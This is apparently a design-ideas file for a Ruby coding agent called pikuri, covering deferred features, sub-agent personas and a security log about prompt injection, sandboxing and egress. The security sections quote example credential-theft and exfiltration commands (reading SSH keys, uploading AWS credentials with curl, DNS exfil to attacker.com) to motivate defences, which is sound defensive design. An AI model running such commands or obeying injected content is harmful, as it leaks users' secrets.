# IDEAS.md

Things pikuri considered, scoped, and deliberately deferred — recorded
here so a future contributor doesn't read the absence as oversight.
Promote into a real plan when the friction shows up.

Related but different: `COMPARISON.md` "Ideas to borrow" is the
externally-sourced version — "opencode/pi do X, should we?" This file
is the internally-sourced version — "we considered X for pikuri and
punted, here's why."

## Coding-agent deferrals

Carried over from the v1 plan once `bin/pikuri-code` shipped. Each was
in scope of the design exercise, considered, and left out on purpose.

- **Permission system.** opencode's three-action `allow` / `deny` /
  `ask` glob rules. v1 ships with two coarse modes (interactive
  `Workspace::Confirmer::TERMINAL` on `Write` / `Bash`; `--yolo` swaps in
  `AUTO_APPROVE`). Revisit once `bin/pikuri-code` has lived a while
  and we know where the friction is. Where things are headed:
  yolo-in-docker, or ClaudeCode's agentic review of the command + automatic approval/denial.
- **Image auto-resize in `Workspace::Read`.** Day-one image support
  refuses anything over 5 MB outright (see
  `lib/pikuri/workspace/read.rb`'s `MAX_IMAGE_BYTES`). PI auto-resizes
  to 2000×2000 with an image-processing dep; we punted on that
  trade-off — adds mini_magick / ruby-vips for one tool's
  ergonomics. Revisit if "Read screenshot.png" being denied on size
  becomes a common annoyance.
- **LSP tool.** opencode wires an LSP client for hover / definition /
  diagnostics. Big-ticket feature; deferred until there's a concrete
  use case beyond "opencode has one."
- **Streaming output from bash.** `Code::Bash` returns a single
  observation `String`. Live process output is meant to stay on the
  listener stream once we add a TUI; meanwhile callers bound wall time
  with coreutils' `timeout`.
- **Session persistence / resumable sub-agents.** opencode's `task`
  tool persists sub-sessions; `Tool::SubAgent` doesn't. Worth doing
  the day we have any other reason to introduce a session store.

## Security perspective

The committed model lives in [`SECURITY.md`](SECURITY.md): a
short code-trust baseline (pikuri + LLM trusted; project bash
sandboxed via Bubblewrap; MCP processes left to Docker), then the
load-bearing prompt-injection section (lethal trifecta broken by
privilege-separated sub-agents, MCP description injection caught
by `Mcp::Verifier`), three worked attacks, and explicit non-goals.
This section is the open-questions log — mitigations under
consideration, open observations, and prior-art notes that haven't
graduated yet.

Threat model scales with capability. `bin/pikuri-chat` today is
small surface (calculator + three stateless network-out tools, no
filesystem writes); `bin/pikuri-code` has the full
read/write/edit/bash kit and is where most of the below bites; an
eventual `bin/pikuri-assistant` with MCP-backed Gmail / Calendar /
Slack inherits both sets and adds the privacy-of-personal-data
axis.

### Trifecta — open mitigations beyond sub-agent separation

The structural defense (privilege-separated `RESEARCHER` and
`FILE_MINER` sub-agents) shipped and is documented in
[`SECURITY.md`](SECURITY.md) §"Prompt injection". Adjacent ideas
still on the table:

- **Provenance tags around tool output** in the context render
  (untrusted-content markers). Cheap, partial — empirical
  question whether the model pays attention to
  `<untrusted>…</untrusted>` framing.
- **Egress allowlist** for `fetch` / `bash` when in interactive
  mode (auto-deny non-allowlisted hosts, prompt for first-use
  additions). Gondolin's egress-proxy pattern (see "Prior art"
  below) is the heavyweight structural version.
- Prompt injection inside skill descriptions? Skills are
  user-installed text; current stance ([`SECURITY.md`](SECURITY.md)
  §"Code trust" — skills bullet) is "user-vetted by definition."
  A `Mcp::Verifier`-shaped pass for skills would belt-and-braces
  it.
- Content-level defenses against `web_scrape` injection beyond
  persona separation (provenance tags are the obvious shape).

### Unsandboxed Bash modes

`Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
readable/writable roots + an OS-runtime baseline, and is the default in
`bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
there `cat ~/.ssh/id_rsa`, `env | grep -i key`,
`curl --upload-file ~/.aws/credentials ...` all run as the user, and
the per-command Confirmer is the only line of defense (`--yolo`
disables that too). The help text says "use only with an outer
sandbox" but nothing enforces it. Worth considering: detect a
container / VM at boot and refuse `--no-sandbox` outside one, or at
least surface a louder warning than the current `LOGGER.warn`.

### Egress is broader than `web_search`

Anywhere bytes leave the box: `bash` → curl/scp/dns/`ping -p`;
`fetch` with attacker-chosen URL; `write` into a Dropbox / iCloud /
git-tracked directory; markdown images rendered by a chat host that
fetches them; error messages echoed back into follow-up turns; the
LLM provider itself when non-local. DNS exfil
(`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
most egress firewalls don't filter port 53.

### Provider-cliff startup banner

The privacy cliff at the LLM provider boundary is documented in
[`SECURITY.md`](SECURITY.md) §"Code trust" — LLM provider bullet
(local llama.cpp default vs. opting into a third-party provider).
The boundary currently moves *silently* when the user reconfigures
`ruby_llm` — worth a loud startup banner ("Outbound LLM provider:
api.openai.com — your prompts and tool results will be sent
there") so the cliff is visible at the moment it matters.

### MCP — open ergonomic / supply-chain questions

The committed MCP story is split across [`SECURITY.md`](SECURITY.md):
the §"Code trust" bullet covers the Docker-for-untrusted-process
recommendation (suggested, not automatic); §"Defense: MCP
description verification" covers the `Mcp::Verifier` pre-flight
scan, with user-curation as the first line of defense. Open:

- **Per-tool first-use consent** (opencode-style sticky approval)
  is probably the right ergonomics shape — first invocation of
  the Gmail-MCP fetch tool is also the first consent prompt.
  Composes with the skill-gated lazy-add design.
- **First-class "wrap MCP in Docker" option** would close the
  supply-chain gap without leaving containerization to the user.
  Hard part: the wrapped MCP's egress / LLM-endpoint reachability
  re-opens the trifecta inside the container, so the egress
  policy of the inner Docker becomes the new question.

### Confirmer as a first-class, last-line-of-defense control

The *role* — last-line-of-defense for the parent agent in
`bin/pikuri-code`, where structural defense has run out and the
human gate is what stops a poisoned context from leaking — is now
documented in [chapter 5 §"The human gate, and why fatigue is the
enemy"](docs/guide/05-security.md). The two requirements (bother the
human only on the genuinely consequential; be excellent when it does
fire) and the dependency on the rest of the kit carrying the routine
load are stated there.

The not-yet-shipped technical piece: `Confirmer#confirm?` today takes
a pre-baked prompt String it can only echo. To live up to the chapter
5 framing — "headline the consequence, not the 80-char `curl` pipe"
— the call needs **structured action context** (kind: write / bash /
fetch; target path or URL; egress destination; in/out of workspace),
so the seam can render the load-bearing presentation rather than
echoing whatever the caller built. Composes with the per-pattern
stickiness wishlist in §"Permission model needs granularity" below —
sticky rules key naturally on structured fields, badly on raw
strings.

### Permission model needs granularity

`Confirmer::TERMINAL` is binary today (approve / deny per call).
Real-world ergonomics push toward:

- Per-tool, per-pattern stickiness ("always allow `git status`",
  "always allow read under `./src/**`").
- Risk tiers — read light, write medium, bash heavy, unknown-host
  fetch heavy.
- Dry-run preview for `Bash` (echoed argv, no shell-metachar
  surprise).
- Time-bound approvals ("for this session only" — implicit on
  session boundaries).

Risk to weigh: every persisted approval is past-you trusting
future-you's judgment, which prompt injection can lean on.

### Output-size DoS and cost

A 50MB scraped page → context window blown → API cost spike or OOM in
the tokenizer. `max_steps` covers the loop-count axis; a per-tool
output-byte cap covers the per-step axis. `Bash` (head+tail truncation
via `OUTPUT_HEAD`/`OUTPUT_TAIL`), `Read` (`MAX_BYTES`), and `WebScrape`
each enforce their own cap; remaining gap is a uniform shape across
all tools and disk-spillover of overflow (PI/opencode prior art —
tempfile path returned to the LLM).

### Misc smaller things

- **Logging hygiene.** `Pikuri.logger_for` shouldn't log Authorization
  headers, request bodies, or full search queries (which are often
  sensitive themselves).
- **`URLCache` on disk.** Cached pages with embedded auth cookies or
  sensitive scrape results — disk encryption matters, backups matter.
- **TOCTOU.** Mostly theoretical for an interactive agent, but
  `Workspace::Filesystem`'s check-then-open isn't atomic on POSIX.
- **Sub-agent context leak.** A child given less context than the
  parent can still leak parent context that flows in via the parent's
  "task" prompt.

### Prior art: how PI and opencode handle this

Surveyed both after writing the above. Findings reinforce the framing
more than they contradict it.

**Common ground.**
- **Neither has prompt-injection defenses.** No provenance markers on
  tool output, no "treat results as data" language in system prompts,
  no separate channels. Confirms the load-bearing tag — nobody in this
  space has solved it.
- **Both cap tool output** at ~2000 lines / 50KB with overflow
  spilled to a tempfile and the path returned to the LLM. Cheap to add
  to pikuri.
- **Both validate sub-agent privilege separation as the right shape** —
  PI via a `--tools` allowlist on the spawned child
  (`packages/coding-agent/examples/extensions/subagent/index.ts:267`),
  opencode via inherited parent-denies plus per-preset deny baselines
  (`packages/opencode/src/agent/subagent-permissions.ts`,
  `agent/agent.ts:178-220`).

**PI ships nothing security-related in core**, but offers isolation
through two opt-in extensions of very different weights. No
permission system in core (only a 30-line example extension
regex-matching `rm -rf` / `sudo` / `chmod 777`), no workspace
constraint (paths resolve absolutely with `~` expansion, no `..`
rejection — `core/tools/path-utils.ts:54-93`), bash unrestricted, no
MCP, no provider warnings, no Dockerfile. The README's stance is one
line: "Run in a container yourself."

The **lighter isolation extension** is `sandbox`: wraps the `bash`
tool only — **bubblewrap on Linux / `sandbox-exec` on macOS** —
driven by `~/.pi/agent/extensions/sandbox.json`. Default policy:
network *on* with an npm / pypi / github allowlist; deny-read for
`~/.ssh` / `~/.aws` / `~/.gnupg`; deny-write for `.env*` / `*.pem` /
`*.key`. Only `bash` is wrapped — `edit` / `write` / `read` execute
outside the sandbox, so a prompt-injection that prefers `edit` over
`bash sed` walks past it. Sub-agents spawn as separate `pi` child
processes that don't inherit the `-e ./sandbox` flag — no recursion.
(`packages/coding-agent/examples/extensions/sandbox/index.ts`.)

The **heavier isolation story is Gondolin**
(<github.com/earendil-works/gondolin>, separate Apache-2.0 project
from the same org) and the more interesting one as prior art.
**Lightweight Linux micro-VMs** (QEMU by default, experimental
`krun` backend) — explicitly stronger isolation than containers /
namespaces. The PI-side extension *"runs pi tools inside a micro-VM
and mounts your project at `/workspace`"*; the whole toolset runs
inside, not just bash. Three design choices worth recording:

- **Programmable HTTP/TLS egress proxy with allowlists.** Not just
  iptables — a real proxy that inspects what's leaving.
- **JS-configurable VFS mounts.** Host decides what filesystem the
  guest sees.
- **Secret-placeholder pattern.** Guest env vars hold placeholders,
  not real values; the egress proxy substitutes the real secret
  **only on outbound requests to allowlisted hosts**. A
  prompt-injection that does `echo $STRIPE_KEY > attacker.com` fails
  twice: env doesn't contain the real key, and `attacker.com` isn't
  allowlisted. Genuinely novel prior art — Anthropic's MCP / OAuth
  flows don't have an equivalent.

Gondolin is also the substrate for **`pi-chat`** (Discord / Telegram
→ Claude bridge, same org) — one micro-VM per channel for
multi-tenant isolation. Worth noting: pi-chat's docs explicitly say
*"All outbound HTTP/TLS open by default"* — the egress policy is
available but not aggressively configured in that product.

**opencode is the opposite.** A sophisticated three-action
`allow` / `deny` / `ask` permission system keyed on
`(permission-name, glob-pattern)`, last-match-wins, default-`ask`,
persisted to per-project SQLite for `always` approvals
(`packages/opencode/src/permission/evaluate.ts:11`,
`permission/index.ts:140-145`), with a **tree-sitter bash parser**
deriving sticky-approval prefix patterns like `git status *`
(`tool/shell.ts:261-265, 308-333`). But `SECURITY.md` is explicit at
the top: *"OpenCode does not sandbox the agent. The permission system
exists as a UX feature... it is not designed to provide security
isolation."* Workspace is soft — out-of-tree triggers an
`external_directory` prompt, not a denial; no realpath / symlink
resolution (`project/instance-context.ts:18-23`). MCP servers spawn
as raw subprocesses inheriting `process.env`; schemas loaded
eagerly (`mcp/index.ts:412-445, 513-549`). Sub-agent presets
`general` / `explore` / `scout` use `"*": "deny"` with selective
allows; parent denies propagate into the child. Skills load from
arbitrary URLs with no signature / integrity check
(`skill/discovery.ts:54-104`). No egress controls, no provider
warnings.

**Worth borrowing (or considering) for pikuri.**
- **Disk spillover for over-cap output** (both). Per-tool byte caps
  already exist in `Bash` / `Read` / `WebScrape`; the missing piece
  is writing the overflow to a tempfile and returning the path so the
  LLM can `grep` it.
- **Sub-agent toolset narrowing** — *shipped* via personas; see
  §"Personas for `Tool::SubAgent`."
- **opencode's `(permission-name, glob-pattern)` ruleset shape** if
  `Confirmer` ever expands beyond binary approve/deny.
- **PI's credential-dir deny-read defaults** (`~/.ssh`, `~/.aws`,
  `~/.gnupg`) — a `Workspace::Filesystem` default denylist gives some real
  protection even without a sandbox, and it's a one-method change.
  Same for deny-write on `.env*` / `*.pem` / `*.key`.
- **Gondolin's secret-placeholder pattern.** A tool surface where env
  vars are placeholders and real values flow only through a curated
  egress proxy is a structural defense against exfil-via-prompt-
  injection — not "approval prompt the user is no longer reading."
  Heavyweight to implement (needs an HTTP/TLS interceptor); flagged
  as future-thought.
- **opencode's explicit "this is UX, not security" framing** in
  their `SECURITY.md` is the honest baseline pikuri's
  [`SECURITY.md`](SECURITY.md) borrows directly under "Non-goals".

**Mental model worth recording:** PI itself ships no isolation in
core. It offers *two extensions of different weights* — the
bubblewrap `sandbox` (bash-only, lighter) and a Gondolin micro-VM
integration (full Linux VM, full toolset). The user-facing "run pi
in a sandbox" story is real, but user-configured and opt-in, not
default. PI is thus prior art for **"ship the sandbox primitive
separately, let the user opt in at the weight they need"** —
different shape from opencode's explicit "we're not a sandbox, run
it in Docker yourself."

## Personas for `Tool::SubAgent`

**v1 shipped.** `Pikuri::Tool::SubAgent` is now persona-driven:
`c.allow_agent(persona)` registers a `Pikuri::Tool::SubAgent::Persona`
(name + description + `tool_names` + system prompt + `max_steps`),
the LLM-facing tool is renamed `agent` with required `name:` (enum
over registered persona names) + `task:` parameters, and an
`<available_agents>` snippet is appended to the system prompt
describing every registered persona. Sub-agent system prompts no
longer inherit from the parent (was the visible bug: "you are a
coding assistant" leaked into a child whose actual job was a focused
lookup); extensions no longer auto-propagate to sub-agents either.
The first bundled persona is `Pikuri::Tool::SubAgent::RESEARCHER`,
shipped in the separate `pikuri-subagents` gem alongside the
`bin/pikuri-minions` fan-out demo (web tools only, 20 steps, prompt
at `pikuri-subagents/prompts/persona-researcher.txt`). The
machinery (`Tool::SubAgent`, `Persona`, `Configurator#allow_agent`)
stays in pikuri-core; bundled `Persona` instances live in
pikuri-subagents so studying pikuri-core doesn't drag in the
persona concept on day one.

**Also shipped: `Pikuri::SubAgent::FILE_MINER`** — read-only fs recon
counterpart to `RESEARCHER`. `tool_names: %w[read grep glob]`, 30
steps, prompt at `pikuri-subagents/prompts/persona-file-miner.txt`,
wired into `bin/pikuri-code` alongside `RESEARCHER` via
`c.add_extension Pikuri::SubAgent::Extension.new(personas: [Pikuri::SubAgent::FILE_MINER, Pikuri::SubAgent::RESEARCHER])`
— the same privilege-separation argument extends to web content
(scraped pages / fetched URLs land in `RESEARCHER`'s context, which
has no `bash` / `write` / `edit` to hijack).
The persona constant references its tools by string name only — no
`require` of `pikuri-workspace` — so the gem stays decoupled (hosts
without `read`/`grep`/`glob` simply don't register it). Privilege-
separation argument is the load-bearing one: a coding agent reading
an untrusted file (vendored README, scraped doc, template repo)
through FILE_MINER can't act on a prompt injection inside it — no
`bash`, no `fetch`, no `write`, no `agent` recursion. Context-economy
is the secondary win.

**Also shipped: `Pikuri::Code::GIT_REPO_RESEARCHER`** — the
"clone-and-dig" persona, third in the lineup. Lives in
`pikuri-code` (not `pikuri-subagents`) because it's the first
persona that ships a tool other than the bundled
`pikuri-subagents` / `pikuri-workspace` surface: a new
`Pikuri::Code::GitClone` (HTTPS-only, shallow, no submodules,
wrapped in the same Bubblewrap sandbox `Bash` uses).
`tool_names: %w[git_clone read grep glob web_search web_scrape fetch]`,
30 steps, prompt at
`pikuri-code/prompts/persona-git-repo-researcher.txt`, wired into
`bin/pikuri-code` as the third entry of the persona list. The
distinguishing structural piece is `needs_temp_workspace: true` —
the persona is declarative-only; `SubAgentTool` owns the lifecycle
(mktmpdir + mint a `Workspace::Filesystem` rooted at the temp dir
+ tear it down at sub-agent close). Trifecta-wise the persona is
same shape as `RESEARCHER`: leg (a) is structurally near-zero
because the temp workspace is disjoint from the parent's
project_root (containment rejects out-of-bounds paths), so cloned
content cannot leave files for the parent's `read` to pick up.
This also partially delivers the "workspace modes" follow-up
below — the `readonly_with_temp` mode generalizes
`needs_temp_workspace` from one persona to a `Persona` field.

Reference shape converges with Claude Code's `subagent_type`,
opencode's `agents` map (`packages/opencode/src/agent/agent.ts:129-281`),
and PI's `subagent` agents
(`packages/coding-agent/examples/extensions/subagent/agents/`).

### Not yet shipped — follow-up work

**Workspace modes.** The persona record today has a narrow
`needs_temp_workspace:` boolean (used by
`GIT_REPO_RESEARCHER` — see above) but no broader
`workspace_mode:` field. File-miner and Researcher work fine on
`inherit` semantics — child reuses parent's `Filesystem`-bound tool
instances by reference, no reconstruction. The interesting modes
from the original proposal stay queued:

- `inherit` — current behavior; what's implicit when the field is
  absent.
- `readonly` — derived `Filesystem` where every parent root is
  readable, none writable. No clones, no extracts.
- `readonly_with_temp` — same plus a fresh `temp:` scratchpad as the
  only writable spot (git-clone / unzip / `mvn dependency:sources`).
  Generalizes `needs_temp_workspace: true` from a single-purpose
  boolean to a composable mode — `GIT_REPO_RESEARCHER` becomes the
  first user once this lands and stops being a special case.

Adding these means promoting `needs_temp_workspace:` to a
`workspace_mode:` enum on the `Persona` record (default
`:inherit`) and a
`Pikuri::Workspace::Filesystem.scoped_readonly_from(parent, with_temp:)`
primitive in `pikuri-workspace`. The fs-touching tools all take
`Filesystem` via constructor today, so the reconstruction is
mechanical — but `bash` would also need `Confirmer::AUTO_APPROVE`
in those modes (the user already approved by picking the persona;
every command still flows through `Event::ToolCall` for audit).
fs-readonly doesn't stop network exfil or fork bombs, so a
`sandbox:` frontmatter key composing with `Code::Bash::Sandbox::Bubblewrap`
is the eventual follow-up.

**Catalog / `.md` discovery.** The current shape ships personas as
Ruby constants (`Pikuri::Tool::SubAgent::RESEARCHER`); good enough
while we have one. Once we ship 3+ and users want to author their
own, the original proposal (Markdown + YAML frontmatter, discovery
under `.pikuri/personas/*.md` / `.claude/agents/*.md` / `.agents/personas/*.md`,
new `pikuri-personas` gem with `Catalog` + `Extension`) becomes the
natural next step. Tool-name validation flips from raise → WARN-and-prune
at that point so a persona referencing an unwired tool just disappears.

**Extension re-propagation.** Sub-agents no longer inherit extensions
(MCP / Skills). Two-phase `configure`/`bind` collapses to "called
once on the parent only." If a persona later needs MCP-backed tools,
the redesign starts from scratch — likely a Persona field declaring
which extensions the child also wires in, plus rebuilding the
two-phase split.

**Per-persona `model:`.** PI has cheap-model-for-cheap-tasks
(haiku for scout, sonnet for planner). Real efficiency win, requires
`ChatTransport` variations per sub-agent. Deferred.

**LLM-authored personas.** Originally floated and deferred; the
escape hatch (ship a `general` persona) still works if it ever
matters.
